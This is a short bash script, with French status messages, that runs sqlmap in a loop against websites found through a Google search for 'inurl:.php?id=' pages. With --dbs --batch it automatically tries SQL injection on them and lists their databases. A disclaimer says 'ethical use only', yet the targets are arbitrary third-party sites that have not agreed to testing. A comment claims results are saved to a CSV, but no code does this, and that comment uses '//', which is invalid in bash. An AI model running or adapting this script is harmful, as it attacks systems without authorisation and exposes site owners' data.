#! /bin/bash
# A simple shell script that launches sqlmap to scrap for vulnerable websites (ethical use only please), please contact the owners of the website if anything has been found
# Fraytags 11/2021

echo LANCEMENT DU SCRIPT

for i in `seq 1 10` ;
do
	python3 sqlmap.py -g inurl:".php?id="$i"" --dbs --batch
	//Here we allow the backup of the positive websites to a .csv
	echo PAUSE INTRABOUCLE
	sleep 15
done
